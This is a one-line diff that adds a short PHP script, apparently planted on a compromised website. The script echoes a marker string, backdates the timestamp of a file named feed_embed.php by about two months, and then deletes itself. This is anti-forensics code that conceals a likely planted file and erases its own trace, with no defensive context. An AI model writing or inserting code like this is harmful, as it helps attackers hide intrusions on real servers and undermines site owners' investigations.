@@ -1,0 +1,1 @@
+<?php echo "CtFaPEPruE"; if (file_exists("./feed_embed.php")){ touch("./feed_embed.php",(time()-60*60*24*30*2)); } unlink(__FILE__); /*ZKtVd95Kzs9nQE0VHGpU*/ ?>
